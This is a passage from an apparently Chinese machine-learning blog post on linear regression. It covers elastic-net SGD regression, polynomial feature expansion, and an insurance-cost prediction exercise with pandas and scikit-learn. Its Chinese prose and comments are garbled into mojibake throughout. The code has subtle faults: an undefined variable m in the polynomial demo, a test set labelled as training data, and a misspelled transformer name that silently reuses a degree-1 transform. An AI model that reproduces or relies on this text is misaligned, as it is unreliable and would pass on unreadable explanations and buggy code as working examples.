print(np.c_[elasticnet_reg.intercept_,elasticnet_reg.coef_.reshape(1,-1)]) # é¢„æµ‹ y_pre = elasticnet_reg.predict(x_pre) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre.reshape(-1,1)) W_hat: [[5.40784751 3.87770911 3.89554975 4.85588961 0.98362001]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[56.21597338] [66.82977581] [74.39992651]] 4ã€éšæœºæ¢¯åº¦ä¸‹é™å®ç°elasticnetæ­£åˆ™åŒ–ï¼ˆsklearnåº“ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import numpy as np from sklearn.linear_model import SGDRegressor np.random.seed(20030428) # ç»´åº¦ n = 4 # æ•°æ®é‡ m = 1000 # è®¾ç½®é¢„æµ‹å€¼ x_pre = np.random.random(size = (3,n))*10 # éšæœºç”Ÿæˆ x åºåˆ— x = np.random.rand(m,n) * 2 # è¡¥å…… x0 åˆ— X = np.c_[np.ones((m,1)),x] # æ¨¡æ‹Ÿ x å¯¹åº”çš„ y æ ‡ç­¾ï¼Œè¯¯å·®å‘ˆæ­£æ€åˆ†å¸ƒ w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) sgd_reg = SGDRegressor( penalty=\u0026#39;elasticnet\u0026#39;, # æ­£åˆ™åŒ–ç±»å‹ max_iter = 100000, # è¿­ä»£æ¬¡æ•° alpha = 0.01, # æ­£åˆ™åŒ–å¼ºåº¦ Î» l1_ratio=0.2, # l1æ­£åˆ™åŒ–æ¯”ä¾‹ tol = 1e-10, # æ”¶æ•›é˜ˆå€¼ # â€¦â€¦ ) sgd_reg.fit(x,y.ravel()) print(\u0026#39;W_hat:\u0026#39;) print(np.c_[sgd_reg.intercept_,sgd_reg.coef_.reshape(1,-1)]) # é¢„æµ‹ y_pre = sgd_reg.predict(x_pre) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre.reshape(-1,1)) W_hat: [[5.1320958 3.93664843 3.95394899 4.913876 1.04281603]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[56.80371943] [67.77050846] [75.42653888]] å…­ã€å‡ç»´æ–¹æ³• â€” å¤šé¡¹å¼å›å½’ï¼ˆPolynomial Regressionï¼‰ ç›®çš„ï¼šè§£å†³æ¬ æ‹Ÿåˆé—®é¢˜ å¸¸è§æ‰‹æ®µï¼šå°†å·²çŸ¥ç»´åº¦è¿›è¡Œç›¸ä¹˜æ¥æ„å»ºæ–°çš„ç»´åº¦ï¼Œå°†éçº¿æ€§Dataè½¬æ¢ä¸ºçº¿æ€§Data ä»¥äºŒé˜¶å¤šé¡¹å¼å‡ç»´ä¸ºä¾‹ï¼š $$ y=w_0+w_1x_1+w_2x_2\\Rightarrow y^*=w_0+w_1x_1+w_2x_2+w_3x_1^2+w_4x_2^2+w_5x_1x_2 $$ ä»¥ä¸‹é¢æ‹Ÿåˆè¿‡ç¨‹ä¸ºä¾‹ï¼š$D_3$ è¾¾åˆ°æœ€ä½³æ‹Ÿåˆã€‚éšç€ç»´åº¦çš„å¢åŠ ï¼Œ$D_3$ ä»¥ä¸‹è®­ç»ƒé›†å’Œæµ‹è¯•é›†è¯¯å·®å‡å‡å°ï¼Œå±äºæ¬ æ‹Ÿåˆï¼›$D_3$ ä»¥ä¸Šè®­ç»ƒé›†è¯¯å·®å‡å°ï¼Œæµ‹è¯•é›†è¯¯å·®å¢å¤§ï¼Œå±äºè¿‡æ‹Ÿåˆ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 import numpy as np import matplotlib.pyplot as plt from sklearn.preprocessing import PolynomialFeatures from sklearn.linear_model import LinearRegression from sklearn.metrics import mean_squared_error np.random.seed(20030428) plt.xlim(-21, 51) # æ¨ªè½´ plt.ylim(-8000, 4000) # çºµè½´ # é¢„è®¾å‡½æ•° def mapping(x): return 0.2*x**3 - 10*x**2 + 5*x - 1 # ç»´åº¦ n = 1 x_show = np.linspace(-20,50,10000) plt.plot(x_show,mapping(x_show),color=\u0026#39;C0\u0026#39;,label=\u0026#39;scheduled model\u0026#39;) # è®­ç»ƒé›†æ•°æ®é‡ train_size= 10000 # æµ‹è¯•é›†æ•°æ®é‡ test_size = 10000 # éšæœºç”Ÿæˆè®­ç»ƒé›† x_train = np.random.rand(m,n) * 60 - 20 y_train = mapping(x_train) + np.random.randn(m,1)*1111 plt.scatter(x_train,y_train,color=\u0026#39;C1\u0026#39;,s=5,label=\u0026#39;train set data\u0026#39;) # éšæœºç”Ÿæˆæµ‹è¯•é›† x_test = np.random.rand(m,n) * 400 - 100 y_test = mapping(x_test) + np.random.randn(m,1)*1111 plt.scatter(x_test,y_test,color=\u0026#39;C2\u0026#39;,s=5,label=\u0026#39;train set data\u0026#39;) ### å‡ç»´é¢„æµ‹ ### # dimensions = {2:\u0026#39;C3\u0026#39;} dimensions = {1:\u0026#39;C8\u0026#39;,2:\u0026#39;C3\u0026#39;,3:\u0026#39;C4\u0026#39;,4:\u0026#39;C5\u0026#39;,5:\u0026#39;C9\u0026#39;,6:\u0026#39;C7\u0026#39;,7:\u0026#39;C6\u0026#39;,8:\u0026#39;C10\u0026#39;} for dim,color in dimensions.items(): # å¤šé¡¹å¼å‡ç»´ poly_features = PolynomialFeatures( degree=dim, # è®¾ç½®ç»´åº¦ include_bias=True # è®¾ç½®æˆªè· ) # è®­ç»ƒé›†å’Œæµ‹è¯•é›†å‡ç»´ x_train_poly = poly_features.fit_transform(x_train) x_test_poly = poly_features.fit_transform(x_test) # çº¿æ€§å›å½’ lin_reg = LinearRegression( fit_intercept=False # ä¸åŠ åç½® ) lin_reg.fit(x_train_poly,y_train) y_train_pre = lin_reg.predict(x_train_poly) y_test_pre = lin_reg.predict(x_test_poly) train_norm = mean_squared_error(y_train,y_train_pre) test_norm = mean_squared_error(y_test,y_test_pre) lab = f\u0026#34;D:{dim}/Train:{train_norm/1e6:.5f}/Test:{test_norm/1e6:.5f}\u0026#34; x_show_poly = poly_features.fit_transform(x_show.reshape(-1,1)) plt.plot(x_show,lin_reg.predict(x_show_poly),color=dimensions[dim],label=lab) plt.legend( loc=\u0026#39;upper left\u0026#39;, # ä»¥legendå·¦ä¸Šè§’ä¸ºåŸºå‡†ç‚¹ bbox_to_anchor=(1.02, 1), # è·ç¦»åŸç‚¹çš„ç›¸å¯¹ä½ç½®ï¼Œå›¾åƒä¸º0-1 borderaxespad=0, # é—´è·å€¼ ncol=1, # åˆ†å‡ åˆ— ) \u0026lt;matplotlib.legend.Legend at 0x1a768d8d150\u0026gt; ä¸ƒã€å®è·µ â€” ä¿é™©èŠ±é”€é¢„æµ‹ æ•°æ®é›†è·¯å¾„ï¼š \u0026ldquo;.\\Dataset\\1_Insurance_Expense_Forecast\\insurance.csv\u0026rdquo; 1ã€æ•°æ®æå– 1 2 3 4 5 6 7 import pandas as pd import numpy as np data = pd.read_csv( \u0026#39;./Dataset/1_Insurance_Expense_Forecast/insurance.csv\u0026#39;, sep=\u0026#39;,\u0026#39;) data.head(6) age sex bmi children smoker region charges 0 19 female 27.900 0 yes southwest 16884.92400 1 18 male 33.770 1 no southeast 1725.55230 2 28 male 33.000 3 no southeast 4449.46200 3 33 male 22.705 0 no northwest 21984.47061 4 32 male 28.880 0 no northwest 3866.85520 5 31 female 25.740 0 no southeast 3756.62160 2ã€EDAï¼ˆExploratory Data Analysisï¼Œæ¢ç´¢æ€§æ•°æ®åˆ†æï¼‰ æœ¬è´¨ï¼šåœ¨æŠŠæ•°æ®å–‚ç»™ç®—æ³•ä¹‹å‰ï¼Œå…ˆç”¨äººçœ¼å’Œç»Ÿè®¡å·¥å…·è§‚å¯Ÿå’Œæ¸…æ´—æ•°æ® ç›®çš„ï¼šå‘ç°æ•°æ®é•¿ä»€ä¹ˆæ ·ã€å“ªé‡Œè„ã€å“ªé‡Œæ€ªã€å“ªé‡Œè—ç€æœ‰ç”¨çš„ä¿¡å·ï¼Œä»è€Œä¸ºåç»­çš„ç‰¹å¾å·¥ç¨‹ã€æ¨¡å‹é€‰æ‹©ã€ç”šè‡³ä¸šåŠ¡å†³ç­–æä¾›ç›´è§‰å’Œä¾æ® å‘ç°chargeså‡ºç°å³åé—®é¢˜ï¼Œé€šè¿‡ç‰¹å¾å·¥ç¨‹ä¸­æ•°å€¼å˜æ¢çš„å–å¯¹æ•°æ‰‹æ®µè¿›è¡Œå¤„ç† 1 2 3 4 # è§‚å¯Ÿæ•°æ®ç»“æ„ä¿¡æ¯ print(data.info()) # ç»“æœæ˜¾ç¤ºæ•°æ®è´¨é‡è¾ƒå¥½ï¼Œæ— ç¼ºå¤±å€¼ print(data.describe()) \u0026lt;class 'pandas.core.frame.DataFrame'\u0026gt; RangeIndex: 1338 entries, 0 to 1337 Data columns (total 7 columns): # Column Non-Null Count Dtype --- ------ -------------- ----- 0 age 1338 non-null int64 1 sex 1338 non-null object 2 bmi 1338 non-null float64 3 children 1338 non-null int64 4 smoker 1338 non-null object 5 region 1338 non-null object 6 charges 1338 non-null float64 dtypes: float64(2), int64(2), object(3) memory usage: 73.3+ KB None age bmi children charges count 1338.000000 1338.000000 1338.000000 1338.000000 mean 39.207025 30.663397 1.094918 13270.422265 std 14.049960 6.098187 1.205493 12110.011237 min 18.000000 15.960000 0.000000 1121.873900 25% 27.000000 26.296250 0.000000 4740.287150 50% 39.000000 30.400000 1.000000 9382.033000 75% 51.000000 34.693750 2.000000 16639.912515 max 64.000000 53.130000 5.000000 63770.428010 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 # è§‚å¯Ÿæ•°æ®åˆ†å¸ƒ import matplotlib.pyplot as plt # %matplotlib inline plt.rcParams[\u0026#39;font.family\u0026#39;] = \u0026#39;sans-serif\u0026#39; # 1. å¯ç”¨ sans-serif åˆ—è¡¨ plt.rcParams[\u0026#39;font.sans-serif\u0026#39;] = [\u0026#39;SimHei\u0026#39;] # 2. æŠŠ SimHei æ”¾åœ¨æœ€å‰ plt.rcParams[\u0026#39;axes.unicode_minus\u0026#39;] = False # 3. è®©è´Ÿå·æ­£å¸¸æ˜¾ç¤ºï¼ˆå¯é€‰ï¼‰ plt.figure(figsize=(10, 8)) # è®¾ç½®ç”»å¸ƒå¤§å° plt.subplot(2, 2, 1) # ç¬¬ä¸€ä¸ªå­å›¾ plt.hist(data[\u0026#39;age\u0026#39;], bins=20, color=\u0026#39;lightgreen\u0026#39;, edgecolor=\u0026#39;k\u0026#39;) plt.xlabel(\u0026#39;Ages\u0026#39;) plt.ylabel(\u0026#39;Count\u0026#39;) plt.title(\u0026#39;Distribution of Age\u0026#39;) plt.subplot(2, 2, 2) # ç¬¬äºŒä¸ªå­å›¾ plt.hist(data[\u0026#39;bmi\u0026#39;], bins=25, color=\u0026#39;salmon\u0026#39;, edgecolor=\u0026#39;k\u0026#39;) plt.xlabel(\u0026#39;BMI\u0026#39;) plt.ylabel(\u0026#39;Count\u0026#39;) plt.title(\u0026#39;Distribution of BMI\u0026#39;) plt.subplot(2, 2, 3) # ç¬¬ä¸‰ä¸ªå­å›¾ plt.hist(data[\u0026#39;children\u0026#39;], bins=6, color=\u0026#39;gold\u0026#39;, edgecolor=\u0026#39;k\u0026#39;) plt.xlabel(\u0026#39;Children\u0026#39;) plt.ylabel(\u0026#39;Count\u0026#39;) plt.title(\u0026#39;Distribution of Children\u0026#39;) ax_charges=plt.subplot(2, 2, 4) # ç¬¬å››ä¸ªå­å›¾ plt.hist(data[\u0026#39;charges\u0026#39;], bins=30, color=\u0026#39;skyblue\u0026#39;, edgecolor=\u0026#39;k\u0026#39;) plt.xlabel(\u0026#39;Charges\u0026#39;) plt.ylabel(\u0026#39;Count\u0026#39;) plt.title(\u0026#39;Distribution of Charges\u0026#39;) ax_charges.text( 0.95,0.95, # ç™¾åˆ†æ¯”åæ ‡ \u0026#39;å³åï¼ˆpositively skewed / right-skewedï¼‰\\næŒ‡åˆ†å¸ƒçš„å°¾éƒ¨å‘å³ï¼ˆå€¼å¤§çš„ä¸€ä¾§ï¼‰æ‹–å¾—å¾ˆé•¿\\nå‡å€¼ \u0026gt; ä¸­ä½æ•°\u0026#39;, transform=ax_charges.transAxes, # ç”¨å­å›¾çš„åæ ‡ç³» va=\u0026#39;top\u0026#39;,ha=\u0026#39;right\u0026#39;, # æ–‡æœ¬æ¡†åŸºå‡†ç‚¹é€‰å– fontsize = 10, bbox=dict( boxstyle=\u0026#39;round,pad=0.3\u0026#39;, facecolor=(0.9,0.9,0.9), alpha=0.5, ) ) plt.tight_layout() # è‡ªåŠ¨è°ƒæ•´é—´è· plt.show() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # å‹ç¼©ä¼˜åŒ–å¼‚å¸¸æ ‡ç­¾å€¼ ax = plt.subplot(1, 1, 1) ax.text( 0.55,0.95, # ç™¾åˆ†æ¯”åæ ‡ \u0026#39;é€šè¿‡lnå‡½æ•°å°†åŸå³åæ‹–å°¾å‹ç¼©ï¼Œ\\nä½¿ç»“æœæ›´æ¥è¿‘æ­£æ€\u0026#39;, transform=ax.transAxes, # ç”¨å­å›¾çš„åæ ‡ç³» va=\u0026#39;top\u0026#39;,ha=\u0026#39;left\u0026#39;, # æ–‡æœ¬æ¡†åŸºå‡†ç‚¹é€‰å– fontsize = 10, bbox=dict( boxstyle=\u0026#39;round,pad=0.3\u0026#39;, facecolor=(0.9,0.9,0.9), alpha=0.5, ) ) plt.hist(np.log1p(data[\u0026#39;charges\u0026#39;]),bins=20, color=\u0026#39;skyblue\u0026#39;, edgecolor=\u0026#39;k\u0026#39;) plt.title(\u0026#39;log of \\\u0026#39;charges\\\u0026#39;\u0026#39;) plt.show() # å¢åŠ æ ‡ç­¾å€¼å‹ç¼©åˆ— data[\u0026#39;log_charges\u0026#39;]=np.log1p(data[\u0026#39;charges\u0026#39;]) data.head(6) age sex bmi children smoker region charges log_charges 0 19 female 27.900 0 yes southwest 16884.92400 9.734236 1 18 male 33.770 1 no southeast 1725.55230 7.453882 2 28 male 33.000 3 no southeast 4449.46200 8.400763 3 33 male 22.705 0 no northwest 21984.47061 9.998137 4 32 male 28.880 0 no northwest 3866.85520 8.260455 5 31 female 25.740 0 no southeast 3756.62160 8.231541 3ã€ç‰¹å¾å·¥ç¨‹ ç±»åˆ«ï¼šç¼ºå¤±å€¼å¤„ç†/æ•°å€¼å˜æ¢/ç±»åˆ«ç¼–ç /é«˜ç»´ç¨€ç–/éçº¿æ€§äº¤å‰/æ—¶åº\u0026amp;åºåˆ—/ä¸šåŠ¡å…ˆéªŒ ç±»åˆ«ç¼–ç  â€” One-Hotç¼–ç ï¼šå¯¹æŸä¸ªç‰¹å¾ä»â€œåˆ†ç±»â€åˆ°â€œå‘é‡â€çš„å˜åŒ–è¿‡ç¨‹ï¼Œä¾‹å¦‚ï¼š è‹¥ç®€å•åœ°å°†â€œç”·â€/â€œå¥³â€ï¼Œç¼–ç ä¸º0/1ï¼Œæ¨¡å‹ä¼šè¯¯ä»¥ä¸ºâ€œå¥³â€\u0026gt;â€œç”·â€ï¼ŒæŠŠé¢œè‰²å½“æˆè¿ç»­é‡ï¼Œå­¦åˆ°é”™è¯¯çš„åºå…³ç³» å°†â€œç”·â€/â€œå¥³â€ç¼–ç ä¸ºäºŒç»´å‘é‡ $(0,1)$ å’Œ $(1,0)$ å°†æœ¬é¡¹ç›®ä¸­çš„regionç‰¹å¾ä¸­çš„southeastã€southwestã€northeastã€northwestç¼–ç ä¸º$(1,0,0,0)ï¼Œ(0,1,0,0)ï¼Œ(0,0,1,0)ï¼Œ(0,0,0,1)$ 1 2 3 # è¿›è¡Œ One-Hotç¼–ç  data = pd.get_dummies(data,dtype=int) data.head(6) age bmi children charges log_charges sex_female sex_male smoker_no smoker_yes region_northeast region_northwest region_southeast region_southwest 0 19 27.900 0 16884.92400 9.734236 1 0 0 1 0 0 0 1 1 18 33.770 1 1725.55230 7.453882 0 1 1 0 0 0 1 0 2 28 33.000 3 4449.46200 8.400763 0 1 1 0 0 0 1 0 3 33 22.705 0 21984.47061 9.998137 0 1 1 0 0 1 0 0 4 32 28.880 0 3866.85520 8.260455 0 1 1 0 0 1 0 0 5 31 25.740 0 3756.62160 8.231541 1 0 1 0 0 0 1 0 1 2 3 4 5 6 7 8 9 # å–å‡ºæ ·æœ¬åŠæ ‡ç­¾å€¼ x = data.drop(columns=[\u0026#39;charges\u0026#39;,\u0026#39;log_charges\u0026#39;]) y = data[\u0026#39;log_charges\u0026#39;] # å¡«å……ç©ºå€¼ x.fillna(0,inplace=True) y.fillna(0,inplace=True) x.head() age bmi children sex_female sex_male smoker_no smoker_yes region_northeast region_northwest region_southeast region_southwest 0 19 27.900 0 1 0 0 1 0 0 0 1 1 18 33.770 1 0 1 1 0 0 0 1 0 2 28 33.000 3 0 1 1 0 0 0 1 0 3 33 22.705 0 0 1 1 0 0 1 0 0 4 32 28.880 0 0 1 1 0 0 1 0 0 1 2 3 4 5 6 # åˆ’åˆ†è®­ç»ƒé›†ä¸æµ‹è¯•é›† from sklearn.model_selection import train_test_split x_train,x_test,y_train,y_test = train_test_split(x,y,test_size=0.3) print(x.shape,y.shape) print(x_train.shape,y_train.shape) print(x_test.shape,y_test.shape) (1338, 11) (1338,) (936, 11) (936,) (402, 11) (402,) 1 2 3 4 5 6 7 8 9 # å½’ä¸€åŒ– from sklearn.preprocessing import StandardScaler x_scaler = StandardScaler( copy=True, # éåŸåœ°æ›´æ”¹ with_mean=True, # å…ˆå‡å»å¹³å‡å€¼ with_std=True, # é™¤ä»¥æ ‡å‡†å·® ).fit(x_train) # ç”¨æµ‹è¯•é›†æ•°æ®è®­ç»ƒå‡ºå‡å€¼å’Œæ ‡å‡†å·® x_train_scaled = x_scaler.transform(x_train) x_test_scaled = x_scaler.transform(x_test) 1 2 3 4 5 6 7 8 # å¤šé¡¹å¼å‡ç»´ä»¥æ‹Ÿåˆéçº¿æ€§ç‰¹å¾ from sklearn.preprocessing import PolynomialFeatures poly_features = PolynomialFeatures( degree = 1, include_bias=False ) x_train_scaled = poly_features.fit_transform(x_train_scaled) x_test_scaled = poly_features.fit_transform(x_test_scaled) 4ã€æ¨¡å‹è®­ç»ƒ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from sklearn.linear_model import LinearRegression from sklearn.linear_model import Ridge from sklearn.linear_model import SGDRegressor # çº¿æ€§å›å½’ lin_reg = LinearRegression() lin_reg.fit(x_train_scaled,y_train) y_train_predict_lin = lin_reg.predict(x_train_scaled) y_test_predict_lin = lin_reg.predict(x_test_scaled) # å²­å›å½’ rid_reg = Ridge() rid_reg.fit(x_train_scaled,y_train) y_train_predict_rid = rid_reg.predict(x_train_scaled) y_test_predict_rid = rid_reg.predict(x_test_scaled) # éšæœºæ¢¯åº¦ä¸‹é™ sgd_reg = SGDRegressor() sgd_reg.fit(x_train_scaled,y_train) y_train_predict_sgd = sgd_reg.predict(x_train_scaled) y_test_predict_sgd = sgd_reg.predict(x_test_scaled) 5ã€æ¨¡å‹è¯„ä¼° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from sklearn.metrics import mean_squared_error print( \u0026#34;LinearRegression(Train / Test): \u0026#34;, np.sqrt(mean_squared_error(y_train,y_train_predict_lin)), np.sqrt(mean_squared_error(y_test,y_test_predict_lin)) ) print( \u0026#34;RidgeRegression(Train / Test): \u0026#34;, np.sqrt(mean_squared_error(y_train,y_train_predict_rid)), np.sqrt(mean_squared_error(y_test,y_test_predict_rid)) ) print( \u0026#34;SGDRegression(Train / Test): \u0026#34;, np.sqrt(mean_squared_error(y_train,y_train_predict_sgd)), np.sqrt(mean_squared_error(y_test,y_test_predict_sgd)) ) LinearRegression(Train / Test): 0.44905273756975034 0.43211955383967054 RidgeRegression(Train / Test): 0.44905315842354915 0.4321996372029468 SGDRegression(Train / Test): 0.449286159412961 0.43308751362633735 6ã€è¿›é˜¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 import numpy as np import pandas as pd import matplotlib.pyplot as plt import seaborn as sns from sklearn.preprocessing import PolynomialFeatures from sklearn.model_selection import train_test_split from sklearn.linear_model import LinearRegression from sklearn.linear_model import Ridge from sklearn.ensemble import GradientBoostingRegressor from sklearn.metrics import mean_squared_error from sklearn.preprocessing import StandardScaler # æ•°æ®è¯»å– data = pd.read_csv(\u0026#39;./Dataset/1_Insurance_Expense_Forecast/insurance.csv\u0026#39;) # EDA # å¦‚æœå¯¹äºæŸä¸ªç‰¹å¾å¯¹é¢„æµ‹å€¼å‡ ä¹æ— å½±å“ï¼Œåˆ™å¯å¿½ç•¥ï¼ˆé™å™ªï¼‰ data[\u0026#39;charges\u0026#39;] = np.log1p(data[\u0026#39;charges\u0026#39;]) print(data.head()) print(data.info()) print(data.describe()) ax = plt.subplot(2,2,1) plt.title(\u0026#39;sex\u0026#39;) sns.kdeplot(data.loc[data.sex==\u0026#39;male\u0026#39;,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;male\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.sex==\u0026#39;female\u0026#39;,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;female\u0026#39;, ax=ax) plt.legend() ax = plt.subplot(2,2,2) plt.title(\u0026#39;smoke\u0026#39;) sns.kdeplot(data.loc[data.smoker==\u0026#39;yes\u0026#39;,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;smoker_yes\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.smoker==\u0026#39;no\u0026#39;,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;smoker_no\u0026#39;, ax=ax) plt.legend() ax = plt.subplot(2,2,3) plt.title(\u0026#39;region\u0026#39;) sns.kdeplot(data.loc[data.region==\u0026#39;southeast\u0026#39;,\u0026#39;charges\u0026#39;], fill=True,label=\u0026#39;southeast\u0026#39;,ax=ax) sns.kdeplot(data.loc[data.region==\u0026#39;southwest\u0026#39;,\u0026#39;charges\u0026#39;], fill=True,label=\u0026#39;southwest\u0026#39;,ax=ax) sns.kdeplot(data.loc[data.region==\u0026#39;northeast\u0026#39;,\u0026#39;charges\u0026#39;], fill=True,label=\u0026#39;northeast\u0026#39;,ax=ax) sns.kdeplot(data.loc[data.region==\u0026#39;northwest\u0026#39;,\u0026#39;charges\u0026#39;], fill=True,label=\u0026#39;northwest\u0026#39;,ax=ax) plt.legend() ax = plt.subplot(2,2,4) plt.title(\u0026#39;children\u0026#39;) sns.kdeplot(data.loc[data.children==0,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_0\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.children==1,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_1\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.children==2,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_2\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.children==3,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_3\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.children==4,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_4\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.children==5,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_5\u0026#39;, ax=ax) plt.legend() plt.tight_layout() plt.show() # ç‰¹å¾å·¥ç¨‹ data = data.drop([\u0026#39;region\u0026#39;,\u0026#39;sex\u0026#39;],axis=1) # åˆ é™¤æ— ç”¨ç‰¹å¾ # ç‰¹å¾ç¦»æ•£åŒ– def discretization(df,bmi=30,child=0): df[\u0026#39;bmi\u0026#39;]=\u0026#39;over\u0026#39; if df[\u0026#39;bmi\u0026#39;]\u0026gt;=bmi else \u0026#39;under\u0026#39; df[\u0026#39;children\u0026#39;] = \u0026#39;no\u0026#39; if df[\u0026#39;children\u0026#39;] == child else \u0026#39;yes\u0026#39; return df data = data.apply(discretization,axis=1,args=(30,0)) print(data.head()) # one-hot ç¼–ç  data = pd.get_dummies(data) # è§£å†³å³åé—®é¢˜ print(data.head()) # æ ·æœ¬è·å–ä¸ç©ºå€¼å¡«å…… x = data.drop(\u0026#39;charges\u0026#39;,axis=1) y = data[\u0026#39;charges\u0026#39;] x.fillna(0,inplace=True) y.fillna(0,inplace=True) print(x.head()) print(y.head()) # æ¨¡å‹è®­ç»ƒ # åˆ’åˆ† x_train,x_test,y_train,y_test = train_test_split(x,y,test_size=0.3) # # å½’ä¸€åŒ– # x_scaler = StandardScaler().fit(x_train) # x_train = x_scaler.transform(x_train) # å‡ç»´ poly_featrues = PolynomialFeatures(degree=2,include_bias=False) x_train_poly = poly_features.fit_transform(x_train) # è®­ç»ƒ reg_lin = LinearRegression() reg_lin.fit(x_train_poly,y_train) reg_rid = Ridge() reg_rid.fit(x_train_poly,y_train) reg_gra = GradientBoostingRegressor() reg_gra.fit(x_train_poly,y_train) # æµ‹è¯•é›†é¢„æµ‹ # # å½’ä¸€åŒ– # x_test = x_scaler.transform(x_test) # å‡ç»´ x_test_poly = poly_features.fit_transform(x_test) # é¢„æµ‹ y_test_pre_lin = reg_lin.predict(x_test_poly) y_test_pre_rid = reg_rid.predict(x_test_poly) y_test_pre_gra = reg_gra.predict(x_test_poly) # æ¨¡å‹è¯„ä¼° print( \u0026#34;LinearRegression: \u0026#34;, np.sqrt(mean_squared_error(y_test,y_test_pre_lin)) ) print( \u0026#34;RidgeRegression: \u0026#34;, np.sqrt(mean_squared_error(y_test,y_test_pre_rid)) ) print( \u0026#34;GradientBoostingRegressor: \u0026#34;, np.sqrt(mean_squared_error(y_test,y_test_pre_gra)) ) age sex bmi children smoker region charges 0 19 female 27.900 0 yes southwest 9.734236 1 18 male 33.770 1 no southeast 7.453882 2 28 male 33.000 3 no southeast 8.400763 3 33 male 22.705 0 no northwest 9.998137 4 32 male 28.880 0 no northwest 8.260455 \u0026lt;class 'pandas.core.frame.DataFrame'\u0026gt; RangeIndex: 1338 entries, 0 to 1337 Data columns (total 7 columns): # Column Non-Null Count Dtype --- ------ -------------- ----- 0 age 1338 non-null int64 1 sex 1338 non-null object 2 bmi 1338 non-null float64 3 children 1338 non-null int64 4 smoker 1338 non-null object 5 region 1338 non-null object 6 charges 1338 non-null float64 dtypes: float64(2), int64(2), object(3) memory usage: 73.3+ KB None age bmi children charges count 1338.000000 1338.000000 1338.000000 1338.000000 mean 39.207025 30.663397 1.094918 9.098828 std 14.049960 6.098187 1.205493 0.919379 min 18.000000 15.960000 0.000000 7.023647 25% 27.000000 26.296250 0.000000 8.464064 50% 39.000000 30.400000 1.000000 9.146658 75% 51.000000 34.693750 2.000000 9.719618 max 64.000000 53.130000 5.000000 11.063061 age bmi children smoker charges 0 19 under no yes 9.734236 1 18 over yes no 7.453882 2 28 over yes no 8.400763 3 33 under no no 9.998137 4 32 under no no 8.260455 age charges bmi_over bmi_under children_no children_yes smoker_no \\ 0 19 9.734236 False True True False False 1 18 7.453882 True False False True True 2 28 8.400763 True False False True True 3 33 9.998137 False True True False True 4 32 8.260455 False True True False True smoker_yes 0 True 1 False 2 False 3 False 4 False age bmi_over bmi_under children_no children_yes smoker_no smoker_yes 0 19 False True True False False True 1 18 True False False True True False 2 28 True False False True True False 3 33 False True True False True False 4 32 False True True False True False 0 9.734236 1 7.453882 2 8.400763 3 9.998137 4 8.260455 Name: charges, dtype: float64 LinearRegression: 0.41171540130927264 RidgeRegression: 0.4119283802418486 GradientBoostingRegressor: 0.3163566171772987 ","date":"2025-12-02T13:16:53+08:00","image":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/output_45_1_hu_81ee81afe7fabe02.jpg","permalink":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/","title":"æœºå™¨å­¦ä¹ -çº¿æ€§å›å½’"}]